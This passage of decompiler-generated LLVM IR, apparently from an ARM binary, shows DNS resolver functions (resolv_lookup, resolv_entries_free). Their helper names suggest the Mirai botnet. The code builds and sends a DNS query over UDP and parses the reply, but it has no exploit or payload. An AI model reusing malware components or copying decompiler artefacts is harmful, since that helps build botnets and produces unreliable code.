  uselistorder i32* @global_var_22408.126, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_2240c.128, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_22410.124, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e528, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e4c8, { 1, 0 }
}

define i32 @resolv_entries_free(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e554 = load i32, i32* @r4, align 4
  store i32 %v3_e554, i32* %stack_var_-8, align 4
  %v6_e554 = load i32, i32* @lr, align 4
  %v0_e558 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e558, i32* @r4, align 4
  %v2_e558 = icmp eq i32 %v0_e558, 0
  br i1 %v2_e558, label %dec_label_pc_e574, label %dec_label_pc_e560

dec_label_pc_e560:                                ; preds = %entry
  %v1_e560 = add i32 %v0_e558, 4
  %v2_e560 = inttoptr i32 %v1_e560 to i32*
  %v3_e560 = load i32, i32* %v2_e560, align 4
  store i32 %v3_e560, i32* %r0.global-to-local, align 4
  store i32 58732, i32* @lr, align 4
  %v1_e568 = icmp ne i32 %v3_e560, 0
  call void @__pseudo_cond_branch(i1 %v1_e568, i32 ptrtoint (i32* @global_var_1357c.35 to i32))
  %v0_e56c = load i32, i32* @r4, align 4
  store i32 %v0_e56c, i32* @r0, align 4
  %v0_e570 = call i32 @free()
  store i32 %v0_e570, i32* %r0.global-to-local, align 4
  %v2_e574.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e574

dec_label_pc_e574:                                ; preds = %entry, %dec_label_pc_e560
  %v1_e578 = phi i32 [ 0, %entry ], [ %v0_e570, %dec_label_pc_e560 ]
  %v2_e574 = phi i32 [ %v3_e554, %entry ], [ %v2_e574.pre, %dec_label_pc_e560 ]
  store i32 %v2_e574, i32* @r4, align 4
  store i32 %v6_e554, i32* @lr, align 4
  ret i32 %v1_e578

; uselistorder directives
  uselistorder i32 %v0_e558, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_e574, { 1, 0 }
}

define i32 @resolv_lookup(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp79 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
  %v3_e57c = load i32, i32* @r4, align 4
  %v9_e57c = load i32, i32* @r6, align 4
  %v12_e57c = load i32, i32* @r7, align 4
  %v15_e57c = load i32, i32* @r8, align 4
  %v18_e57c = load i32, i32* @sb, align 4
  %v21_e57c = load i32, i32* @sl, align 4
  %v24_e57c = load i32, i32* @fp, align 4
  %v27_e57c = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_e594 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_e594, i32* @fp, align 4
  %v0_e59c = load i32, i32* @r5, align 4
  store i32 %v0_e59c, i32* %r0.global-to-local, align 4
  %v1_e5a0 = inttoptr i32 %v0_e59c to i8*
  %v2_e5a0 = call i32 @util_strlen(i8* %v1_e5a0)
  %v2_e5a8 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_e5a8, i32* @sl, align 4
  %v2_e5ac = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_e5ac, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_e5b4 = add i32 %v2_e5a0, 1
  store i32 %v1_e5b4, i32* %r0.global-to-local, align 4
  %v2_e5b8 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_e5b8, i32* %r2.global-to-local, align 4
  store i32 %v2_e5ac, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_e5b4, i32* %r3.global-to-local, align 4
  %v2_e5f4146 = icmp eq i32 %v1_e5b4, 0
  store i1 %v2_e5f4146, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_e5fc147 = add i32 %v2_e5b8, -1
  store i32 %v1_e5fc147, i32* %r1.global-to-local, align 4
  %tmp116148 = icmp slt i32 %v1_e5b4, 1
  br i1 %tmp116148, label %dec_label_pc_e604, label %dec_label_pc_e5c8

dec_label_pc_e5c8:                                ; preds = %entry, %bb115
  %v0_e5c8151 = phi i32 [ %v1_e5e8, %bb115 ], [ 0, %entry ]
  %v1_e5d4150.off0 = phi i8 [ %extract.t152, %bb115 ], [ 0, %entry ]
  %v2_e608149 = phi i32 [ %v1_e5ec, %bb115 ], [ %v2_e5b8, %entry ]
  %v1_e5c8 = load i32, i32* @r5, align 4
  %v2_e5c8 = add i32 %v1_e5c8, %v0_e5c8151
  %v3_e5c8 = inttoptr i32 %v2_e5c8 to i8*
  %v4_e5c8 = load i8, i8* %v3_e5c8, align 1
  %v6_e5c8 = zext i8 %v4_e5c8 to i32
  store i32 %v6_e5c8, i32* %r3.global-to-local, align 4
  %v2_e5cc = icmp eq i8 %v4_e5c8, 0
  store i1 %v2_e5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e5cc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e5c8
  %v8_e5d0 = icmp eq i8 %v4_e5c8, 46
  store i1 %v8_e5d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e5d0, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_e5c8, %bb
  %v3_e5d4 = load i32, i32* %r6.global-to-local, align 4
  %v4_e5d4 = inttoptr i32 %v3_e5d4 to i8*
  store i8 %v1_e5d4150.off0, i8* %v4_e5d4, align 1
  %v0_e5d8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e5d8.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_e5d8.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_e5d8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_e5d8.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_e5d8 = phi i32 [ %v3_e5d8.pre, %.thread..thread7_crit_edge ], [ %v2_e608149, %bb ]
  %v1_e5d8.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_e5c8, %bb ]
  %v4_e5d8 = add i32 %v3_e5d8, -1
  %v5_e5d8 = inttoptr i32 %v4_e5d8 to i8*
  store i8 %v1_e5d8.off0, i8* %v5_e5d8, align 1
  %v0_e5dc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e5dc.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_e5dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e5dc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread9:                                         ; preds = %.thread7
  %v1_e5dc11 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e5dc11, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread12:                                        ; preds = %.thread7
  %v1_e5e4 = load i32, i32* @lr, align 4
  %v2_e5e4 = urem i32 %v1_e5e4, 256
  store i32 %v2_e5e4, i32* %r4.global-to-local, align 4
  br label %bb115

bb115:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_e5f833 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_e5e4, %.thread12 ]
  %v0_e5e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_e5e8 = add i32 %v0_e5e8, 1
  store i32 %v1_e5e8, i32* %ip.global-to-local, align 4
  %v0_e5ec = load i32, i32* %r2.global-to-local, align 4
  %v1_e5ec = add i32 %v0_e5ec, 1
  store i32 %v1_e5ec, i32* %r2.global-to-local, align 4
  %v1_e5f0.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_e5f0 = sub i32 %v1_e5f0.pre, %v1_e5e8
  store i32 %v2_e5f0, i32* %r3.global-to-local, align 4
  %v2_e5f4 = icmp eq i32 %v2_e5f0, 0
  store i1 %v2_e5f4, i1* %cpsr_z.global-to-local, align 1
  %v1_e5f8 = add nuw nsw i32 %v0_e5f833, 1
  store i32 %v1_e5f8, i32* @lr, align 4
  store i32 %v0_e5ec, i32* %r1.global-to-local, align 4
  %tmp116 = icmp slt i32 %v2_e5f0, 1
  %extract.t152 = trunc i32 %v0_e5f833 to i8
  br i1 %tmp116, label %dec_label_pc_e604, label %dec_label_pc_e5c8

dec_label_pc_e604:                                ; preds = %bb115, %entry
  %v1_e5fc.lcssa = phi i32 [ %v1_e5fc147, %entry ], [ %v0_e5ec, %bb115 ]
  store i32 0, i32* @r4, align 4
  %v4_e608 = inttoptr i32 %v1_e5fc.lcssa to i8*
  store i8 0, i8* %v4_e608, align 1
  store i32 %v2_e5ac, i32* %r0.global-to-local, align 4
  %v1_e610 = bitcast i32* %stack_var_-2232 to i8*
  %v2_e610 = call i32 @util_strlen(i8* %v1_e610)
  %v2_e614 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_e614, i32* %r1.global-to-local, align 4
  %v1_e618 = load i32, i32* @sb, align 4
  %v2_e618 = add i32 %v1_e618, %v2_e610
  store i32 %v2_e618, i32* @r5, align 4
  %v0_e620 = load i32, i32* @r4, align 4
  store i32 %v0_e620, i32* %stack_var_-68, align 4
  store i32 %v2_e5ac, i32* %r0.global-to-local, align 4
  %v2_e630 = call i32 @util_strlen(i8* %v1_e610)
  %v1_e634 = add i32 %v2_e630, 17
  store i32 %v1_e634, i32* %r0.global-to-local, align 4
  %v0_e63c = call i32 @rand_next()
  %v1_e63c = sext i32 %v0_e63c to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_e648 = mul nuw nsw i64 %v1_e63c, 2147516417
  %v6_e648 = udiv i64 %v5_e648, 4294967296
  %v7_e648 = trunc i64 %v6_e648 to i32
  %v8_e648 = trunc i64 %v5_e648 to i32
  store i32 %v8_e648, i32* @lr, align 4
  store i32 %v7_e648, i32* %r2.global-to-local, align 4
  %v5_e64c4 = udiv i64 %v5_e648, 140737488355328
  %v5_e64c = trunc i64 %v5_e64c4 to i32
  %v6_e64c = add i32 %v5_e64c, %v0_e63c
  store i32 16, i32* @r1, align 4
  %v6_e658 = urem i32 %v6_e64c, 65536
  store i32 %v6_e658, i32* %ip.global-to-local, align 4
  %v2_e660 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e660, i32* @r0, align 4
  %v5_e664 = trunc i32 %v6_e64c to i16
  %v0_e668 = call i32 @util_zero()
  store i32 %v0_e668, i32* %r0.global-to-local, align 4
  store i32 13568, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_e698 = load i32, i32* @r5, align 4
  %v1_e698 = add i32 %v0_e698, 1
  store i32 %v1_e698, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i16 %v5_e664, i16* %stack_var_-2244, align 2
  %v4_e6ac = inttoptr i32 %v1_e698 to i16*
  store i16 256, i16* %v4_e6ac, align 2
  %v0_e6b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e6b0 = trunc i32 %v0_e6b0 to i16
  %v2_e6b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_e6b0 = add i32 %v2_e6b0, 2
  %v4_e6b0 = inttoptr i32 %v3_e6b0 to i16*
  store i16 %v1_e6b0, i16* %v4_e6b0, align 2
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_e748 = ptrtoint i32* %stack_var_-196 to i32
  %v2_e770 = ptrtoint i32* %stack_var_-40 to i32
  %v2_e79c = ptrtoint i32* %stack_var_-52 to i32
  %v2_e7e0 = ptrtoint i16* %stack_var_-4292 to i32
  %v2_e874 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_e87c = bitcast i32* %stack_var_-4280 to i8*
  %v4_e8a0 = zext i16 %tmp79 to i32
  %v2_e8a4 = icmp eq i16 %tmp79, 0
  br label %dec_label_pc_e6bc

dec_label_pc_e6bc:                                ; preds = %dec_label_pc_e828, %dec_label_pc_e604
  %v1_e6c0 = phi i32 [ -1, %dec_label_pc_e604 ], [ %v0_e6bc.pre, %dec_label_pc_e828 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_e604 ], [ %v1_e828, %dec_label_pc_e828 ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_e6bc = icmp eq i32 %v1_e6c0, -1
  store i1 %v7_e6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6bc, label %bb118, label %bb117

bb117:                                            ; preds = %dec_label_pc_e6bc
  store i32 %v1_e6c0, i32* %r0.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %dec_label_pc_e6bc, %bb117
  store i32 59080, i32* @lr, align 4
  %v1_e6c4 = xor i1 %v7_e6bc, true
  call void @__pseudo_cond_branch(i1 %v1_e6c4, i32 ptrtoint (i32* @global_var_14a50.115 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* @r1, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e6d4 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_e6d4, i32* %r0.global-to-local, align 4
  %v7_e6d8 = icmp eq i32 %v3_e6d4, -1
  store i1 %v7_e6d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e6d4, i32* @r6, align 4
  br i1 %v7_e6d8, label %dec_label_pc_e868, label %dec_label_pc_e6e4

dec_label_pc_e6e4:                                ; preds = %bb118
  store i32 %v2_e660, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e6f0 = call i32 @__libc_connect(i32 %v3_e6d4, i32 %v2_e660, i32 16)
  store i32 %v3_e6f0, i32* %r0.global-to-local, align 4
  %v7_e6f4 = icmp eq i32 %v3_e6f0, -1
  store i1 %v7_e6f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6f4, label %dec_label_pc_e830, label %dec_label_pc_e6fc

dec_label_pc_e6fc:                                ; preds = %dec_label_pc_e6e4
  %v0_e6fc = load i32, i32* @r6, align 4
  store i32 %v0_e6fc, i32* %r0.global-to-local, align 4
  store i32 %v2_e5a8, i32* %r1.global-to-local, align 4
  store i32 %v1_e634, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e70c = call i32 @__libc_send(i32 %v0_e6fc, i32 %v2_e5a8, i32 %v1_e634, i32 16384)
  store i32 %v4_e70c, i32* %r0.global-to-local, align 4
  %v7_e710 = icmp eq i32 %v4_e70c, -1
  store i1 %v7_e710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e710, label %dec_label_pc_e830, label %dec_label_pc_e718

dec_label_pc_e718:                                ; preds = %dec_label_pc_e6fc
  %v0_e718 = load i32, i32* @r6, align 4
  store i32 %v0_e718, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e724 = call i32 @__libc_fcntl(i32 3, i32 %v0_e718)
  %v0_e728 = load i32, i32* @r6, align 4
  store i32 %v0_e728, i32* %r1.global-to-local, align 4
  %v1_e72c = or i32 %v2_e724, 2048
  store i32 %v1_e72c, i32* @r2, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_e734 = call i32 @__libc_fcntl(i32 4, i32 %v0_e728)
  store i32 %v2_e734, i32* %r0.global-to-local, align 4
  store i32 %v2_e614, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v2_e748, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e750

dec_label_pc_e750:                                ; preds = %dec_label_pc_e750, %dec_label_pc_e718
  %v1_e754 = phi i32 [ %v1_e758, %dec_label_pc_e750 ], [ 4, %dec_label_pc_e718 ]
  store i32 0, i32* @r4, align 4
  %v3_e754 = add i32 %v1_e754, %v2_e748
  %v4_e754 = inttoptr i32 %v3_e754 to i32*
  store i32 0, i32* %v4_e754, align 4
  %v0_e758 = load i32, i32* %r3.global-to-local, align 4
  %v1_e758 = add i32 %v0_e758, 4
  store i32 %v1_e758, i32* %r3.global-to-local, align 4
  %v7_e75c = icmp eq i32 %v1_e758, 128
  br i1 %v7_e75c, label %dec_label_pc_e764, label %dec_label_pc_e750

dec_label_pc_e764:                                ; preds = %dec_label_pc_e750
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e764 = load i32, i32* @r6, align 4
  %v3_e764 = udiv i32 %v0_e764, 32
  %v3_e76c = mul nuw nsw i32 %v3_e764, 4
  store i32 %v3_e76c, i32* %r3.global-to-local, align 4
  %v2_e774 = add i32 %v3_e76c, %v2_e770
  store i32 %v2_e774, i32* @r5, align 4
  %v1_e778 = add i32 %v2_e774, -156
  %v2_e778 = inttoptr i32 %v1_e778 to i32*
  %v3_e778 = load i32, i32* %v2_e778, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e780 = urem i32 %v0_e764, 32
  store i32 %v1_e780, i32* @r7, align 4
  %v7_e784 = shl i32 1, %v1_e780
  %v8_e784 = or i32 %v3_e778, %v7_e784
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_e784, i32* %v2_e778, align 4
  %v0_e794 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_e794, i32* %stack_var_-52, align 4
  store i32 %v2_e79c, i32* @lr, align 4
  store i32 %v2_e614, i32* %ip.global-to-local, align 4
  %v0_e7a4 = load i32, i32* @r6, align 4
  %v1_e7a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_e7a4 = add i32 %v1_e7a4, %v0_e7a4
  store i32 %v2_e7a4, i32* %r0.global-to-local, align 4
  %v0_e7ac = load i32, i32* @r4, align 4
  store i32 %v0_e7ac, i32* %r2.global-to-local, align 4
  store i32 %v0_e7ac, i32* %r3.global-to-local, align 4
  %v5_e7b8 = call i32 @__libc_select(i32 %v2_e7a4, i32 %v2_e748, i32 %v0_e7ac, i32 %v0_e7ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_e7b8, i32* %r0.global-to-local, align 4
  %v7_e7bc = icmp eq i32 %v5_e7b8, -1
  store i1 %v7_e7bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7bc, label %dec_label_pc_e840, label %dec_label_pc_e7c4

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e764
  %v1_e7c4 = load i32, i32* @r4, align 4
  %v9_e7c4 = icmp eq i32 %v5_e7b8, %v1_e7c4
  store i1 %v9_e7c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e7c4, label %dec_label_pc_e820, label %dec_label_pc_e7cc

dec_label_pc_e7cc:                                ; preds = %dec_label_pc_e7c4
  %v0_e7cc = load i32, i32* @r5, align 4
  %v1_e7cc = add i32 %v0_e7cc, -156
  %v2_e7cc = inttoptr i32 %v1_e7cc to i32*
  %v3_e7cc = load i32, i32* %v2_e7cc, align 4
  %v1_e7d0 = load i32, i32* @r7, align 4
  %v6_e7d0 = ashr i32 %v3_e7cc, %v1_e7d0
  store i32 %v6_e7d0, i32* %r3.global-to-local, align 4
  %v1_e7d4 = urem i32 %v6_e7d0, 2
  %v2_e7d4 = icmp eq i32 %v1_e7d4, 0
  store i1 %v2_e7d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e7d4, label %dec_label_pc_e840, label %dec_label_pc_e7dc

dec_label_pc_e7dc:                                ; preds = %dec_label_pc_e7cc
  store i32 %v2_e7e0, i32* @r5, align 4
  store i32 %v2_e7e0, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e7f0 = load i32, i32* @r6, align 4
  store i32 %v0_e7f0, i32* %r0.global-to-local, align 4
  %v6_e7fc = call i32 @__libc_recvfrom(i32 %v0_e7f0, i32 %v2_e7e0, i32 2048, i32 16384, i32 %v1_e7c4, i32 %v1_e7c4)
  store i32 %v6_e7fc, i32* %r4.global-to-local, align 4
  %v0_e804 = load i32, i32* @sb, align 4
  store i32 %v0_e804, i32* %r0.global-to-local, align 4
  %v1_e808 = inttoptr i32 %v0_e804 to i8*
  %v2_e808 = call i32 @util_strlen(i8* %v1_e808)
  %v1_e80c = add i32 %v2_e808, 17
  store i32 %v1_e80c, i32* %r0.global-to-local, align 4
  %v0_e810 = load i32, i32* %r4.global-to-local, align 4
  %v3_e810 = icmp ult i32 %v0_e810, %v1_e80c
  %v9_e810 = icmp eq i32 %v0_e810, %v1_e80c
  store i1 %v9_e810, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_e810, label %dec_label_pc_e820, label %dec_label_pc_e874

dec_label_pc_e820:                                ; preds = %dec_label_pc_e7dc, %dec_label_pc_e874, %dec_label_pc_e8a0, %dec_label_pc_e7c4, %dec_label_pc_e868
  %v0_e820 = load i32, i32* @r8, align 4
  %v7_e820 = icmp eq i32 %v0_e820, 5
  store i1 %v7_e820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e820, label %dec_label_pc_e840, label %dec_label_pc_e828

dec_label_pc_e828:                                ; preds = %dec_label_pc_e830, %dec_label_pc_e820
  %v0_e828 = phi i32 [ %v0_e838, %dec_label_pc_e830 ], [ %v0_e820, %dec_label_pc_e820 ]
  %v1_e828 = add i32 %v0_e828, 1
  %v0_e6bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e6bc

dec_label_pc_e830:                                ; preds = %dec_label_pc_e6fc, %dec_label_pc_e6e4
  %v0_e830 = phi i32 [ %v4_e70c, %dec_label_pc_e6fc ], [ %v3_e6f0, %dec_label_pc_e6e4 ]
  %v1_e830 = add i32 %v0_e830, 2
  store i32 %v1_e830, i32* %r0.global-to-local, align 4
  %v1_e834 = call i32 @sleep(i32 %v1_e830)
  store i32 %v1_e834, i32* %r0.global-to-local, align 4
  %v0_e838 = load i32, i32* @r8, align 4
  %v7_e838 = icmp eq i32 %v0_e838, 5
  store i1 %v7_e838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e838, label %dec_label_pc_e840, label %dec_label_pc_e828

dec_label_pc_e840:                                ; preds = %dec_label_pc_e830, %dec_label_pc_e820, %dec_label_pc_e7cc, %dec_label_pc_e764, %dec_label_pc_e8ac, %dec_label_pc_e8b8.backedge
  %v0_e840 = load i32, i32* @r6, align 4
  store i32 %v0_e840, i32* %r0.global-to-local, align 4
  %v1_e844 = call i32 @__GI___libc_close(i32 %v0_e840)
  store i32 %v1_e844, i32* %r0.global-to-local, align 4
  %v0_e848 = load i32, i32* @fp, align 4
  %v1_e848 = inttoptr i32 %v0_e848 to i8*
  %v2_e848 = load i8, i8* %v1_e848, align 1
  %v3_e848 = zext i8 %v2_e848 to i32
  store i32 %v3_e848, i32* @r4, align 4
  %v2_e84c = icmp eq i8 %v2_e848, 0
  store i1 %v2_e84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e84c, label %dec_label_pc_e990, label %dec_label_pc_e854

dec_label_pc_e854:                                ; preds = %dec_label_pc_e840, %dec_label_pc_e990
  %v0_e854 = phi i32 [ %v0_e848, %dec_label_pc_e840 ], [ %v0_e9a4, %dec_label_pc_e990 ]
  store i32 %v0_e854, i32* %r0.global-to-local, align 4
  store i32 %v3_e57c, i32* @r4, align 4
  store i32 %v9_e57c, i32* @r6, align 4
  store i32 %v12_e57c, i32* @r7, align 4
  store i32 %v15_e57c, i32* @r8, align 4
  store i32 %v18_e57c, i32* @sb, align 4
  store i32 %v21_e57c, i32* @sl, align 4
  store i32 %v24_e57c, i32* @fp, align 4
  store i32 %v27_e57c, i32* @lr, align 4
  ret i32 %v0_e854

dec_label_pc_e868:                                ; preds = %bb118
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e86c = call i32 @sleep(i32 1)
  store i32 %v1_e86c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e820

dec_label_pc_e874:                                ; preds = %dec_label_pc_e7dc
  store i32 %v2_e874, i32* @sb, align 4
  store i32 %v2_e874, i32* %r0.global-to-local, align 4
  %v2_e87c = call i32 @util_strlen(i8* %v1_e87c)
  store i32 %v2_e770, i32* @lr, align 4
  %v4_e888 = load i16, i16* %stack_var_-4292, align 2
  %v5_e888 = sext i16 %v4_e888 to i32
  store i32 %v5_e888, i32* %r3.global-to-local, align 4
  store i32 %v6_e64c, i32* @r1, align 4
  %v1_e890 = load i32, i32* @sb, align 4
  %v9_e894 = icmp eq i16 %v4_e888, %v5_e664
  store i1 %v9_e894, i1* %cpsr_z.global-to-local, align 1
  %v2_e890 = add i32 %v2_e87c, 5
  %v1_e898 = add i32 %v2_e890, %v1_e890
  store i32 %v1_e898, i32* %r0.global-to-local, align 4
  br i1 %v9_e894, label %dec_label_pc_e8a0, label %dec_label_pc_e820

dec_label_pc_e8a0:                                ; preds = %dec_label_pc_e874
  store i32 %v4_e8a0, i32* %r3.global-to-local, align 4
  store i1 %v2_e8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8a4, label %dec_label_pc_e820, label %dec_label_pc_e8ac

dec_label_pc_e8ac:                                ; preds = %dec_label_pc_e8a0
  %div = udiv i16 %tmp79, 256
  %v3_e8ac = zext i16 %div to i32
  store i32 %v3_e8ac, i32* %r2.global-to-local, align 4
  %v1_e8b0 = mul nuw nsw i32 %v4_e8a0, 256
  %v4_e8b4 = and i32 %v1_e8b0, 65280
  %v5_e8b4 = or i32 %v4_e8b4, %v3_e8ac
  %v1_e8b8134 = add nsw i32 %v5_e8b4, -1
  %v3_e8bc135 = mul i32 %v1_e8b8134, 65536
  store i32 %v3_e8bc135, i32* %r3.global-to-local, align 4
  %v7_e8c0141 = icmp eq i32 %v3_e8bc135, -65536
  store i1 %v7_e8c0141, i1* %cpsr_z.global-to-local, align 1
  %v3_e8c4142 = urem i32 %v1_e8b8134, 65536
  store i32 %v3_e8c4142, i32* @r8, align 4
  br i1 %v7_e8c0141, label %dec_label_pc_e840, label %dec_label_pc_e8cc

dec_label_pc_e8cc:                                ; preds = %dec_label_pc_e8ac, %dec_label_pc_e8b8.backedge
  %v3_e8c4144 = phi i32 [ %v3_e8c4, %dec_label_pc_e8b8.backedge ], [ %v3_e8c4142, %dec_label_pc_e8ac ]
  %v0_e91c143 = phi i32 [ %storemerge29, %dec_label_pc_e8b8.backedge ], [ %v1_e898, %dec_label_pc_e8ac ]
  store i32 %v0_e91c143, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_e8d818 = inttoptr i32 %v0_e91c143 to i8*
  %v2_e8d819 = load i8, i8* %v1_e8d818, align 1
  %v3_e8d820 = zext i8 %v2_e8d819 to i32
  store i32 %v3_e8d820, i32* %r2.global-to-local, align 4
  %v2_e8dc21 = icmp eq i8 %v2_e8d819, 0
  store i1 %v2_e8dc21, i1* %cpsr_z.global-to-local, align 1
  %v3_e8e022 = mul nuw nsw i32 %v3_e8d820, 256
  store i32 %v3_e8e022, i32* @r1, align 4
  br i1 %v2_e8dc21, label %dec_label_pc_e914, label %dec_label_pc_e8e8.preheader

dec_label_pc_e8e8.preheader:                      ; preds = %dec_label_pc_e8cc, %dec_label_pc_e8d8.backedge
  %v1_e9b4 = phi i32 [ %v1_e9b450, %dec_label_pc_e8d8.backedge ], [ 1, %dec_label_pc_e8cc ]
  %v0_e9ac48 = phi i32 [ %v0_e9ac, %dec_label_pc_e8d8.backedge ], [ 0, %dec_label_pc_e8cc ]
  %v0_e8f446 = phi i32 [ %v3_e8e0, %dec_label_pc_e8d8.backedge ], [ %v3_e8e022, %dec_label_pc_e8cc ]
  %v0_e8f044 = phi i32 [ %v1_e9b0, %dec_label_pc_e8d8.backedge ], [ %v0_e91c143, %dec_label_pc_e8cc ]
  %v0_e8e842 = phi i32 [ %v3_e8d8, %dec_label_pc_e8d8.backedge ], [ %v3_e8d820, %dec_label_pc_e8cc ]
  br label %dec_label_pc_e8e8

dec_label_pc_e8e8:                                ; preds = %dec_label_pc_e8e8.preheader, %dec_label_pc_e8f0
  %v0_e9ac = phi i32 [ %v0_e9ac48, %dec_label_pc_e8e8.preheader ], [ 1, %dec_label_pc_e8f0 ]
  %v0_e8f4 = phi i32 [ %v0_e8f446, %dec_label_pc_e8e8.preheader ], [ %v3_e90c, %dec_label_pc_e8f0 ]
  %v0_e9b0 = phi i32 [ %v0_e8f044, %dec_label_pc_e8e8.preheader ], [ %v2_e8fc, %dec_label_pc_e8f0 ]
